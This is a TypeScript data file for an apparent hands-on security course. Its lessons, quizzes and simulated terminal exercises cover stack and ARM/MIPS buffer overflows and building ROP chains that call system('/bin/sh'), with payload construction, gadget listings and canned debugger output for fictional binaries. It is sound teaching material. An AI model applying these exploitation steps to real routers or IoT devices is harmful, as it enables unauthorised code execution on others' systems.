import { DayData } from "@/lib/types";

export const week6: DayData[] = [
  {
    day: 36,
    title: "Memory Layout 101 — Stack, Heap, and How Buffers Overflow",
    hook: "On November 2, 1988, Robert Tappan Morris — a 23-year-old Cornell graduate student — released a program that exploited a buffer overflow in the Unix 'fingerd' service. The Morris Worm spread to roughly 6,000 machines, about 10% of the entire internet at the time. It caused an estimated $10-100 million in damages and became the first computer worm to gain significant mainstream attention. Morris was the first person convicted under the Computer Fraud and Abuse Act. That was over 35 years ago. The same bug class — buffer overflows — still dominates embedded systems today. Most routers, IP cameras, and IoT devices ship without ASLR, without stack canaries, without DEP. The same vulnerability that brought down the 1988 internet works on the router sitting in your living room right now. Today you'll learn exactly why.",
    lesson: [
      "Every running program has a memory layout divided into distinct regions. The text segment holds the program's machine code (read-only and executable). The data segment stores global and static variables. The heap grows upward for dynamic allocations (malloc/free). The stack grows downward and manages function calls — local variables, function arguments, saved registers, and the return address that tells the CPU where to go when the current function finishes.",
      "When a function is called, a stack frame is pushed: first the arguments, then the return address (the instruction to execute after the function returns), then the saved base pointer, and finally the local variables. The local variables sit at the lowest address in the frame. The return address sits just above them. This layout is critical: if a local buffer overflows, it overwrites upward — directly into the saved return address.",
      "A buffer overflow occurs when a program writes more data into a buffer than it can hold. If a function allocates a 64-byte array on the stack and copies 128 bytes into it, those extra 64 bytes overwrite everything above the buffer: the saved base pointer and the return address. When the function tries to return, the CPU reads the overwritten return address and jumps to whatever the attacker placed there — arbitrary code execution.",
      "On modern desktop systems, mitigations like ASLR (randomizing memory layout), stack canaries (detecting overwrites before the return), and DEP/NX (preventing execution of stack data) make exploitation difficult. But most embedded systems — especially MIPS routers and ARM IoT devices — ship with none of these protections. The firmware is loaded at a fixed address, there are no canaries, and the stack is executable. This makes embedded buffer overflows as straightforward to exploit as they were in 1988."
    ],
    exercise: {
      type: "choice",
      prompt: "A function has this stack layout (from low to high address):\n\n  [local_buffer: 64 bytes] [saved_base_pointer: 4 bytes] [return_address: 4 bytes] [arguments]\n\nIf an attacker writes 72 bytes into local_buffer, what gets overwritten?",
      choices: [
        "Nothing — the buffer can hold 72 bytes",
        "The saved base pointer is overwritten, but the return address is intact",
        "Both the saved base pointer AND the return address are fully overwritten",
        "The arguments above the return address are overwritten"
      ],
      validator: (input: string) => {
        const choice = input.trim().toUpperCase();
        if (choice === "C") {
          return { correct: true, hint: "Correct! 72 - 64 = 8 bytes of overflow. The saved base pointer occupies the first 4 bytes above the buffer, and the return address occupies the next 4 bytes. 8 bytes of overflow covers both completely. An attacker now controls both the frame pointer and the return address — the function will jump to attacker-controlled code when it returns." };
        }
        if (choice === "A") {
          return { correct: false, hint: "The buffer is only 64 bytes. Writing 72 bytes means 8 bytes overflow beyond the buffer boundary. Those 8 bytes overwrite what's above the buffer in memory." };
        }
        if (choice === "B") {
          return { correct: false, hint: "Close, but 72 - 64 = 8 bytes of overflow. The saved base pointer is only 4 bytes, so the first 4 overflow bytes cover it. The remaining 4 overflow bytes reach the return address and overwrite it completely." };
        }
        if (choice === "D") {
          return { correct: false, hint: "72 bytes of overflow only extends 8 bytes past the buffer (72-64=8). The saved base pointer (4 bytes) and return address (4 bytes) together are exactly 8 bytes — so they get overwritten, but the arguments beyond them are not reached." };
        }
        return { correct: false, hint: "Choose A, B, C, or D. Calculate: 72 bytes written - 64 byte buffer = 8 bytes of overflow. What structures occupy those 8 bytes above the buffer?" };
      },
    },
    quiz: {
      question: "Why are buffer overflows on embedded systems (like routers) generally easier to exploit than on modern desktop operating systems?",
      options: [
        { label: "A", value: "Embedded systems use more complex software that has more bugs" },
        { label: "B", value: "Embedded systems typically lack ASLR, stack canaries, and DEP/NX — the mitigations that make desktop exploitation difficult" },
        { label: "C", value: "Desktop operating systems don't have buffers" },
        { label: "D", value: "Embedded systems are connected to the internet and desktops are not" },
      ],
      correct: "B",
      explanation: "Most embedded firmware loads at fixed memory addresses (no ASLR), doesn't use stack canaries to detect overflow, and often has an executable stack (no DEP/NX). This means a simple buffer overflow can directly overwrite the return address and jump to attacker-controlled shellcode — exactly like exploitation worked in the 1990s. Desktop systems have layered mitigations that force attackers to use advanced techniques like ROP.",
    },
    output: "Today you learned how memory is organized in a running program, why buffer overflows happen, and why embedded systems are particularly vulnerable due to missing mitigations.",
    homework: [
      {
        title: "Exploiting Buffer Overflows on Embedded ARM Devices",
        url: "https://www.rliu.dev/blog/ectf-arm-buffer-overflow/",
        description: "Hands-on walkthrough of exploiting a stack buffer overflow on an ARM embedded device — from vulnerability discovery to working exploit."
      },
      {
        title: "Microcontroller Exploits",
        url: "https://nostarch.com/microcontroller-exploits",
        description: "No Starch Press book covering exploitation techniques specific to microcontrollers — stack overflows, ROP, and code injection on bare-metal devices."
      }
    ],
  },
  {
    day: 37,
    title: "Buffer Overflows on ARM",
    hook: "ARM processors power over 95% of smartphones and a massive share of IoT devices — security cameras, smart speakers, medical devices, automotive ECUs. When you find a buffer overflow on ARM, the exploitation path has its own flavor. ARM uses a link register (LR) to store return addresses instead of pushing them directly to the stack like x86. Function prologues save LR to the stack, and epilogues restore it. Understanding this calling convention is essential for controlling execution flow. ARM also has two instruction sets — ARM (32-bit) and Thumb (16-bit) — and knowing which mode your target uses determines how your exploit is structured. Today you'll crash an ARM binary, control the program counter, and understand exactly what's happening at the register level.",
    lesson: [
      "ARM's calling convention differs from x86 in important ways. When a function is called, the return address goes into the Link Register (LR/x30) instead of being pushed to the stack. Simple 'leaf' functions (those that don't call other functions) can return using 'bx lr' without ever touching the stack. But complex functions that call other functions must save LR to the stack in their prologue ('push {fp, lr}') and restore it in their epilogue ('pop {fp, pc}'). This saved LR on the stack is your overflow target.",
      "ARM has two main execution modes: ARM mode (32-bit instructions, all aligned to 4 bytes) and Thumb mode (16-bit instructions for code density). The lowest bit of a branch target determines the mode: if bit 0 is 1, the CPU switches to Thumb; if 0, it uses ARM. When crafting exploits, your addresses must have the correct LSB or the CPU will fault. Modern ARM devices (ARMv7+) predominantly use Thumb-2, which mixes 16-bit and 32-bit instructions.",
      "To exploit an ARM buffer overflow: (1) find the vulnerable function using reverse engineering, (2) determine the offset from the buffer start to the saved LR on the stack, (3) overwrite LR with your target address, (4) ensure the correct Thumb/ARM bit is set. The offset calculation is the same as x86 — use a cyclic pattern (like De Bruijn sequences) and check which bytes appear in PC after the crash.",
      "Debugging ARM binaries uses GDB with a cross-architecture stub. For emulated targets, 'qemu-arm -g 1234 ./vulnerable_binary' starts the binary paused with a GDB server on port 1234. Then 'gdb-multiarch ./vulnerable_binary' with 'target remote :1234' connects the debugger. Key registers to watch: PC (program counter — equivalent to EIP), LR (link register — the return address), SP (stack pointer), and R0-R3 (function arguments)."
    ],
    exercise: {
      type: "terminal",
      prompt: "You have a vulnerable ARM binary. Exploit the buffer overflow step by step:\n• file vuln_arm\n• qemu-arm -g 1234 ./vuln_arm $(python3 -c \"print('A'*200)\")\n• gdb-multiarch ./vuln_arm -ex 'target remote :1234' -ex 'continue' -ex 'info registers' -ex 'bt'\n• python3 -c \"from pwn import cyclic; print(cyclic(200))\" | qemu-arm ./vuln_arm\n• python3 -c \"from pwn import cyclic_find; print(cyclic_find(0x61616172))\"\n• python3 -c \"import struct; payload = b'A'*68 + struct.pack('<I', 0xdeadbeef); print(payload)\" | qemu-arm ./vuln_arm",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        file: (args: string) => {
          if (args.includes("vuln_arm")) return "vuln_arm: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, not stripped";
          return `${args}: data`;
        },
        "qemu-arm": (args: string) => {
          if (args.includes("-g 1234")) return "[*] Starting vuln_arm with GDB server on port 1234...\n[*] Waiting for GDB connection...";
          if (args.includes("AAAA") || args.includes("200")) return "Buffer content: AAAAAAAAAA...\n\nProgram received signal SIGSEGV\nFault address: 0x41414141\n\n[!] Segmentation fault — PC = 0x41414141 (controlled!)";
          if (args.includes("cyclic") || args.includes("aaaa")) return "Buffer content: aaaabaaacaaadaaaeaaafaaa...\n\nProgram received signal SIGSEGV\nFault address: 0x61616172\n\n[!] Segmentation fault — PC = 0x61616172";
          if (args.includes("deadbeef") || args.includes("struct")) return "Buffer content: AAAAAAAAAA...\n\nProgram received signal SIGSEGV\nFault address: 0xdeadbeef\n\n[!] Segmentation fault — PC = 0xDEADBEEF\n[+] SUCCESS: You control the program counter!";
          return "qemu-arm: usage: qemu-arm [-g <port>] <binary> [args]";
        },
        "gdb-multiarch": (args: string) => {
          if (args.includes("vuln_arm")) return "GNU gdb (GDB) 13.2 — multiarch\nReading symbols from ./vuln_arm...\n(gdb) target remote :1234\nRemote debugging using :1234\n0x000103e0 in _start ()\n(gdb) continue\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n\n(gdb) info registers\nr0             0x0         0\nr1             0x7efff5d0  2130703824\nr2             0xc8        200\nr3             0x41414141  1094795585\nr4             0x41414141  1094795585\nr5             0x41414141  1094795585\nr6             0x41414141  1094795585\nr7             0x41414141  1094795585\nr8             0x0         0\nr9             0x0         0\nr10            0x41414141  1094795585\nr11            0x41414141  1094795585   ← FP overwritten\nsp             0x7efff650  0x7efff650\nlr             0x41414141  1094795585   ← LR overwritten!\npc             0x41414141  0x41414141   ← PC controlled!\ncpsr           0x60000010  1610612752\n\n(gdb) bt\n#0  0x41414141 in ?? ()\nCannot access memory at address 0x41414141\n\n[!] The attacker controls PC, LR, FP, and registers R3-R7, R10-R11\n[!] This is a fully exploitable stack buffer overflow";
          return "gdb-multiarch: usage: gdb-multiarch <binary>";
        },
        python3: (args: string) => {
          if (args.includes("cyclic(200)")) return "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaab";
          if (args.includes("cyclic_find")) return "68";
          if (args.includes("struct.pack")) return "[binary payload: 68 bytes of 'A' + \\xef\\xbe\\xad\\xde]";
          return "python3: invalid syntax";
        },
        checksec: (args: string) => {
          if (args.includes("vuln_arm")) return "[*] Checking vuln_arm:\n    Arch:     arm-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x10000)\n    ASLR:     Disabled (fixed base)\n\n[!] No protections enabled — classic embedded target";
          return `checksec: ${args}: not found`;
        },
        help: () => "Available commands: file, qemu-arm, gdb-multiarch, python3, checksec, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "On ARM, the Link Register (LR) stores the return address. How does a buffer overflow exploit this?",
      options: [
        { label: "A", value: "The overflow corrupts LR directly in the CPU register during function execution" },
        { label: "B", value: "Non-leaf functions save LR to the stack; overflowing a stack buffer overwrites the saved LR, which is later loaded into PC" },
        { label: "C", value: "ARM's LR is protected by hardware and cannot be overwritten" },
        { label: "D", value: "The overflow changes the function's arguments stored in R0-R3" },
      ],
      correct: "B",
      explanation: "When a non-leaf function calls another function, it must save LR to the stack (since the call instruction will overwrite LR with the new return address). The function prologue does 'push {fp, lr}' and the epilogue does 'pop {fp, pc}' — loading the saved LR directly into the program counter. If a buffer overflow overwrites the saved LR on the stack, the attacker controls where PC points when the function returns.",
    },
    output: "Today you learned ARM-specific buffer overflow exploitation — how the Link Register works, how to calculate offsets, and how to control the program counter on ARM targets.",
    homework: [
      {
        title: "Azeria Labs",
        url: "https://azeria-labs.com/",
        description: "The gold standard for ARM exploitation education — covers ARM assembly, buffer overflows, ROP, and heap exploitation with hands-on exercises."
      },
      {
        title: "A Noob's Guide to ARM Exploitation",
        url: "https://ad2001.gitbook.io/a-noobs-guide-to-arm-exploitation/",
        description: "Beginner-friendly guide to ARM exploitation — walks through each step from understanding ARM basics to building working exploits."
      }
    ],
  },
  {
    day: 38,
    title: "Buffer Overflows on MIPS — The Router's Architecture",
    hook: "MIPS is everywhere in routers. TP-Link, Netgear, D-Link, Tenda, ASUS — look inside almost any consumer router under $100 and you'll find a MIPS processor. But MIPS has architectural quirks that make exploitation uniquely interesting. The instruction cache and data cache are separate and not automatically synchronized — so if you write shellcode to memory and try to execute it, the CPU might still see the old data in the instruction cache. MIPS has branch delay slots — the instruction after a branch always executes, even if the branch is taken. And MIPS calling conventions use $ra (return address register) saved on the stack, similar to ARM's LR but with its own twist. Today you'll learn what makes MIPS exploitation different from everything else.",
    lesson: [
      "MIPS uses a register-based calling convention. When a function is called, the return address is placed in the $ra register (register 31). Like ARM, leaf functions can return with 'jr $ra' without touching the stack. Non-leaf functions save $ra to the stack in their prologue and restore it in their epilogue. The saved $ra on the stack is your overflow target. Function arguments are passed in $a0-$a3 (registers 4-7), with additional arguments on the stack.",
      "The cache coherency problem is MIPS's most distinctive exploitation challenge. MIPS has separate instruction cache (I-cache) and data cache (D-cache) that are not automatically synchronized. When you write data to memory (like shellcode), it goes through the D-cache. But when the CPU fetches instructions, it reads from the I-cache, which may still contain old data. You must force a cache flush before executing injected code. The common technique: call sleep(1) or another libc function via ROP — the function call triggers a cache flush as a side effect.",
      "Branch delay slots are another MIPS quirk. In MIPS, the instruction immediately following a branch instruction always executes — regardless of whether the branch is taken. This means 'jr $ra; addiu $sp, $sp, 32' will execute the addiu BEFORE actually jumping. When building ROP chains, you must account for delay slot instructions or your gadgets will behave unexpectedly. Some gadgets are only useful because of their delay slot instruction.",
      "Despite these quirks, MIPS routers are often the easiest targets to exploit. Most run firmware loaded at fixed addresses (0x00400000 is common), with no ASLR, no stack canaries, and executable stacks. The static linking common in BusyBox-based firmware means all libc functions are at predictable addresses. You can find your ROP gadgets and shellcode addresses before even running the exploit. Tools like mipsrop (an IDA plugin) and ropper help find gadgets in MIPS binaries."
    ],
    exercise: {
      type: "terminal",
      prompt: "Exploit a MIPS router binary with its unique architectural challenges:\n• file vuln_mips\n• checksec vuln_mips\n• qemu-mipsel -g 1234 ./vuln_mips $(python3 -c \"print('A'*300)\")\n• gdb-multiarch ./vuln_mips -ex 'target remote :1234' -ex 'continue' -ex 'info registers' -ex 'bt'\n• python3 -c \"from pwn import cyclic; print(cyclic(300))\" | qemu-mipsel ./vuln_mips\n• python3 -c \"from pwn import cyclic_find; print('Offset to $ra:', cyclic_find(0x61616174))\"",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        file: (args: string) => {
          if (args.includes("vuln_mips")) return "vuln_mips: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped";
          return `${args}: data`;
        },
        checksec: (args: string) => {
          if (args.includes("vuln_mips")) return "[*] Checking vuln_mips:\n    Arch:     mips-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled (stack is executable!)\n    PIE:      No PIE (0x400000)\n    ASLR:     Disabled\n\n[!] Zero mitigations — typical embedded MIPS binary\n[!] Executable stack means direct shellcode injection is possible\n[!] BUT: remember MIPS cache coherency issues!";
          return `checksec: ${args}: not found`;
        },
        "qemu-mipsel": (args: string) => {
          if (args.includes("-g 1234")) return "[*] Starting vuln_mips with GDB server on port 1234...\n[*] Waiting for GDB connection...";
          if (args.includes("AAAA") || args.includes("300")) return "Received input: AAAAAAA...\nProcessing request...\n\nProgram received signal SIGSEGV\n\n[!] Segmentation fault — $pc = 0x41414141\n[!] $ra was overwritten by buffer overflow";
          if (args.includes("cyclic") || args.includes("aaaa")) return "Received input: aaaabaaacaaadaaa...\nProcessing request...\n\nProgram received signal SIGSEGV\n\n[!] Segmentation fault — $pc = 0x61616174";
          return "qemu-mipsel: usage: qemu-mipsel [-g <port>] <binary> [args]";
        },
        "gdb-multiarch": (args: string) => {
          if (args.includes("vuln_mips")) return "GNU gdb (GDB) 13.2 — multiarch\nReading symbols from ./vuln_mips...\n(gdb) target remote :1234\nRemote debugging using :1234\n0x00400640 in __start ()\n(gdb) continue\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n\n(gdb) info registers\n          zero       at       v0       v1\n R0   00000000 00000001 00000000 0000012c\n           a0       a1       a2       a3\n R4   41414141 41414141 41414141 41414141\n           t0       t1       t2       t3\n R8   00000000 00000000 00000000 00000000\n           t4       t5       t6       t7\n R12  00000000 00000000 00000000 00000000\n           s0       s1       s2       s3\n R16  41414141 41414141 41414141 41414141  ← saved regs overwritten\n           s4       s5       s6       s7\n R20  41414141 41414141 41414141 41414141  ← saved regs overwritten\n           t8       t9       k0       k1\n R24  00000000 00000000 00000000 00000000\n           gp       sp       s8       ra\n R28  004a0000 7fff6e00 41414141 41414141  ← $ra CONTROLLED!\n\n           pc\n      41414141  ← PC controlled via $ra!\n\n(gdb) bt\n#0  0x41414141 in ?? ()\nCannot access memory at address 0x41414141\n\n[!] Attacker controls $ra, $s0-$s7, $s8 (frame pointer), and $a0-$a3";
          return "gdb-multiarch: usage: gdb-multiarch <binary>";
        },
        python3: (args: string) => {
          if (args.includes("cyclic(300)")) return "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaab...";
          if (args.includes("cyclic_find")) return "Offset to $ra: 76";
          return "python3: invalid syntax";
        },
        objdump: (args: string) => {
          if (args.includes("vuln_mips") && args.includes("-d")) return "00400a40 <vulnerable_function>:\n  400a40:  27bdffc0  addiu   sp,sp,-64       # allocate 64 bytes\n  400a44:  afbf003c  sw      ra,60(sp)        # save $ra at sp+60\n  400a48:  afbe0038  sw      s8,56(sp)        # save $s8\n  ...\n  400a70:  0040f809  jalr    strcpy           # VULNERABLE: no bounds check!\n  400a74:  00000000  nop                      # branch delay slot\n  ...\n  400aa0:  8fbf003c  lw      ra,60(sp)        # restore $ra from stack\n  400aa4:  8fbe0038  lw      s8,56(sp)        # restore $s8\n  400aa8:  03e00008  jr      ra               # jump to (overwritten) $ra\n  400aac:  27bd0040  addiu   sp,sp,64         # delay slot: fix stack";
          return `objdump: ${args}: no such file`;
        },
        help: () => "Available commands: file, checksec, qemu-mipsel, gdb-multiarch, python3, objdump, help, clear",
        clear: () => "",
      },
    },
    quiz: {
      question: "What is the MIPS cache coherency problem and how does it affect shellcode execution?",
      options: [
        { label: "A", value: "MIPS caches are unified, so there is no coherency problem" },
        { label: "B", value: "MIPS has separate instruction and data caches — shellcode written to memory may not be visible to the instruction fetch unit until the cache is flushed" },
        { label: "C", value: "MIPS caches prevent all code injection attacks automatically" },
        { label: "D", value: "The cache coherency problem only affects MIPS64 processors, not MIPS32" },
      ],
      correct: "B",
      explanation: "MIPS uses a Harvard-style split cache: the D-cache (data cache) handles memory reads/writes, and the I-cache (instruction cache) handles instruction fetches. When you write shellcode to memory, it passes through the D-cache. But the I-cache still contains whatever was at that address before. The CPU tries to execute stale cached instructions instead of your shellcode. The fix: trigger a cache flush by calling a function like sleep() via ROP before jumping to your shellcode.",
    },
    output: "Today you learned MIPS-specific exploitation — the $ra register, cache coherency problems, branch delay slots, and why MIPS routers are among the easiest targets to exploit.",
    homework: [
      {
        title: "Exploiting the TP-Link TL-WR841N V10",
        url: "https://ktln2.org/2020/03/29/exploiting-mips-router/",
        description: "Complete walkthrough of exploiting a real MIPS router — from vulnerability discovery through ROP chain to remote code execution."
      },
      {
        title: "ROPing Routers from Scratch: Tenda AC8",
        url: "https://0reg.dev/blog/tenda-ac8-rop",
        description: "Detailed write-up on building a ROP exploit for a MIPS router from scratch — covers gadget finding, chain construction, and cache flush tricks."
      }
    ],
  },
  {
    day: 39,
    title: "Return-Oriented Programming — When You Can't Inject Code",
    hook: "Imagine a kidnapper who can only communicate using words cut from newspaper headlines. They can't write their own words, but by carefully selecting and arranging existing words, they can compose any message they want. Return-Oriented Programming works the same way. When a system has DEP/NX enabled (marking the stack as non-executable), you can't inject and run your own shellcode. But you don't need to. Every instruction the program needs is already in memory — inside the program's own code and its loaded libraries. By chaining together small fragments of existing code (called 'gadgets'), you can build any computation you want, using the program's own instructions against it. ROP is the technique that broke DEP, and it's the foundation of modern exploitation.",
    lesson: [
      "A ROP gadget is a short sequence of instructions ending in a 'return' instruction (ret on x86, 'pop pc' or 'bx lr' on ARM, 'jr $ra' on MIPS). For example: 'pop r0; bx lr' loads a value from the stack into r0 and returns. By placing a sequence of gadget addresses on the stack, each return instruction jumps to the next gadget, creating a chain of operations without ever executing code on the stack itself.",
      "DEP (Data Execution Prevention), also called NX (No eXecute), marks memory pages as either writable or executable — never both. This prevents classic shellcode injection because the stack is writable but not executable. ROP bypasses this entirely: every gadget lives in executable memory (the program's .text section or loaded libraries). The attacker only writes addresses and data to the stack — which is allowed — and the existing code does the rest.",
      "Building a ROP chain requires finding useful gadgets in the target binary. Tools like ROPgadget and ropper scan binaries for instruction sequences ending in returns. Common gadgets you need: 'pop {register}; ret' (load a controlled value into a register), 'mov r0, r1; ret' (move values between registers), and 'syscall; ret' or calls to system()/exec() to spawn a shell. On embedded systems, statically-linked BusyBox binaries contain thousands of gadgets — more than enough to build any exploit.",
      "The ROP chain layout on the stack looks like: [gadget1_addr] [arg_for_gadget1] [gadget2_addr] [arg_for_gadget2] ... When the vulnerable function returns, it jumps to gadget1. Gadget1 pops its argument and returns, jumping to gadget2. This continues until the final gadget calls system(\"/bin/sh\") or equivalent, giving the attacker a shell. On MIPS, remember that 'jr $ra' has a branch delay slot — the instruction after the jump always executes and must be accounted for."
    ],
    exercise: {
      type: "input",
      prompt: "Explain in your own words: What is a ROP gadget, why does DEP/NX prevent traditional shellcode injection, and how does ROP bypass it?\n\n(Your answer should mention: what a gadget is, what DEP does, and why ROP still works)",
      placeholder: "Type your explanation...",
      validator: (input: string) => {
        const lower = input.toLowerCase();
        const hasGadget = lower.includes("gadget") || lower.includes("instruction") || lower.includes("code fragment") || lower.includes("snippet");
        const hasDEP = lower.includes("dep") || lower.includes("nx") || lower.includes("non-executable") || lower.includes("not executable") || lower.includes("no execute") || lower.includes("data execution");
        const hasBypass = lower.includes("existing code") || lower.includes("already in memory") || lower.includes("reuse") || lower.includes("program's own") || lower.includes("executable memory") || lower.includes("chain") || lower.includes("return") || lower.includes("bypass");

        if (hasGadget && hasDEP && hasBypass) {
          return { correct: true, hint: "Excellent explanation! You've captured the key concepts: ROP gadgets are small instruction sequences ending in return instructions, DEP/NX prevents injecting new code by making the stack non-executable, and ROP bypasses this by chaining together gadgets that already exist in executable memory — reusing the program's own code to build an arbitrary computation." };
        }
        if (hasGadget && hasDEP) {
          return { correct: false, hint: "Good — you understand gadgets and DEP. Now explain WHY ROP works despite DEP: the gadgets are in executable memory (the program's own code sections), so they're allowed to run. Only the addresses on the stack are controlled by the attacker." };
        }
        if (hasGadget || hasDEP) {
          return { correct: false, hint: "You're on the right track. Make sure to cover all three parts: (1) what a ROP gadget is (short instruction sequence ending in return), (2) what DEP/NX does (makes stack non-executable), and (3) how ROP bypasses it (uses existing code in executable memory)." };
        }
        return { correct: false, hint: "A ROP gadget is a small sequence of instructions ending in a 'return'. DEP/NX prevents running code on the stack. ROP bypasses this by chaining gadgets that already exist in the program's executable memory — no new code needs to execute on the stack." };
      },
    },
    quiz: {
      question: "You find a gadget 'pop {r0, pc}' in an ARM binary. What does this gadget allow you to do?",
      options: [
        { label: "A", value: "Delete register r0 and crash the program" },
        { label: "B", value: "Load a controlled value from the stack into r0 (setting a function argument) and jump to the next gadget" },
        { label: "C", value: "Push r0 onto the stack and save the program counter" },
        { label: "D", value: "This gadget is useless for ROP chains" },
      ],
      correct: "B",
      explanation: "'pop {r0, pc}' pops two values from the stack: the first goes into r0 (which is the first function argument register on ARM), the second goes into PC (the program counter, determining where execution goes next). This is an incredibly useful gadget: it lets you control a function argument AND chain to the next gadget. Stack layout: [value_for_r0] [next_gadget_addr].",
    },
    output: "Today you learned Return-Oriented Programming — how ROP gadgets work, why DEP/NX stops shellcode injection, and how ROP bypasses it by reusing existing executable code.",
    homework: [
      {
        title: "ROPing on Aarch64 — The CTF Style",
        url: "http://blog.perfect.blue/ROPing-on-Aarch64",
        description: "Perfect Blue's walkthrough of ROP exploitation on ARM64 — covers gadget selection, chain construction, and calling conventions specific to AArch64."
      },
      {
        title: "ROPing Our Way to RCE",
        url: "https://modzero.com/en/blog/roping-our-way-to-rce/",
        description: "Modzero demonstrates building a ROP chain to achieve remote code execution on a real embedded device — from crash to working exploit."
      }
    ],
  },
  {
    day: 40,
    title: "Building ROP Chains",
    hook: "You've found a buffer overflow. You've calculated the offset to the return address. You know ROP theory. Now it's time to build one. In this day you'll use real tools — ROPgadget and ropper — to scan a firmware binary for usable gadgets, chain them together to call system(\"/bin/sh\"), and construct a working exploit payload. This is the part where theory becomes practice: selecting gadgets from thousands of candidates, arranging stack data precisely, and watching your chain execute step by step in a debugger. By the end of today, you'll have built a ROP chain from scratch.",
    lesson: [
      "Finding gadgets is the first step. ROPgadget and ropper are the industry-standard tools. Running 'ROPgadget --binary target_binary' dumps every gadget found in the binary. For a statically-linked MIPS BusyBox binary, this can return 10,000+ gadgets. Filter for what you need: 'ROPgadget --binary target --search \"pop\"' finds register-loading gadgets. 'ropper -f target --search \"mov\"' finds data movement gadgets.",
      "For a typical system(\"/bin/sh\") exploit on MIPS, you need: (1) a gadget to load the address of the string \"/bin/sh\" into $a0 (first argument register), (2) a gadget to load the address of system() into a register, (3) a gadget to jump to that register. On MIPS, a common pattern is: load $a0 with a pointer to '/bin/sh', then jump directly to the address of system(). Since the binary is not PIE and has no ASLR, all addresses are known at exploit-writing time.",
      "Stack layout for a MIPS ROP chain targeting system(\"/bin/sh\"): at the overflow offset, place the address of a 'load $a0; jr $ra' gadget. Above it, place the data the gadget pops (the address of '/bin/sh' string found with 'strings -t x binary | grep /bin/sh'). Above that, place the address of system(). The chain executes: restore $ra -> jump to gadget1 -> load '/bin/sh' address into $a0 -> return to system() -> shell spawned.",
      "Debugging your ROP chain is essential. Small mistakes — wrong endianness, off-by-one offset, missing delay slot accounting — will crash instead of giving you a shell. Run the exploit under GDB: set breakpoints at each gadget address and single-step through the chain. Verify that each register has the expected value before the chain proceeds to the next gadget. On MIPS, remember the delay slot: the instruction after 'jr $ra' executes before the jump takes effect."
    ],
    exercise: {
      type: "terminal",
      prompt: "Build a ROP chain for a MIPS binary to call system(\"/bin/sh\"):\n• ROPgadget --binary vuln_mips | head -30\n• ROPgadget --binary vuln_mips --search 'lw .ra' | head -10\n• ropper -f vuln_mips --search 'move a0'\n• strings -t x vuln_mips | grep '/bin/sh'\n• python3 exploit.py\n• qemu-mipsel -L ./lib ./vuln_mips < payload.bin",
      placeholder: "$ ",
      validator: (_input: string) => {
        return { correct: true, hint: "" };
      },
      terminalCommands: {
        ROPgadget: (args: string) => {
          if (args.includes("--search") && args.includes("lw")) return "Gadgets information\n============================================================\n0x00401234 : lw $ra, 0x24($sp) ; lw $s0, 0x20($sp) ; jr $ra ; addiu $sp, $sp, 0x28\n0x00402abc : lw $ra, 0x1c($sp) ; lw $s1, 0x18($sp) ; lw $s0, 0x14($sp) ; jr $ra ; addiu $sp, $sp, 0x20\n0x00403def : lw $ra, 0x3c($sp) ; lw $s3, 0x38($sp) ; lw $s2, 0x34($sp) ; lw $s1, 0x30($sp) ; lw $s0, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x40\n0x004045a0 : lw $ra, 0x14($sp) ; jr $ra ; addiu $sp, $sp, 0x18\n0x00404bc0 : lw $ra, 0x1c($sp) ; move $a0, $s0 ; jalr $s1 ; nop\n\nUnique gadgets found: 5";
          if (args.includes("head")) return "Gadgets information\n============================================================\n0x00400420 : addiu $a0, $sp, 0x18 ; jr $ra ; nop\n0x00400524 : move $a0, $s0 ; jr $ra ; nop\n0x004005e8 : move $t9, $s1 ; jalr $t9 ; nop\n0x00400634 : lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x28\n0x004006a0 : addiu $a0, $zero, 1 ; jr $ra ; nop\n0x00400780 : sw $a0, 0($s0) ; jr $ra ; nop\n0x00400840 : li $a1, 0 ; jr $ra ; nop\n0x00400920 : move $a0, $s0 ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20\n0x00400a10 : syscall ; nop\n0x00400b50 : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20\n\nTotal: 3,847 unique gadgets found in vuln_mips";
          return `ROPgadget: ${args}: not found`;
        },
        ropper: (args: string) => {
          if (args.includes("move a0")) return "[INFO] Searching for gadgets: move a0\n\n0x00400524: move $a0, $s0; jr $ra; nop;\n0x00400920: move $a0, $s0; lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;\n0x00404bc0: lw $ra, 0x1c($sp); move $a0, $s0; jalr $s1; nop;\n\n3 gadgets found.";
          if (args.includes("system")) return "[INFO] Searching for gadgets: system\n\n0x00443210: system() function entry point\n\n1 gadget found.";
          return `ropper: ${args}: invalid option`;
        },
        strings: (args: string) => {
          if (args.includes("/bin/sh")) return "  4a3e20 /bin/sh\n  4a3f40 /bin/sh -c %s\n  4a4010 /bin/shm";
          return `strings: ${args}: no matches`;
        },
        python3: (args: string) => {
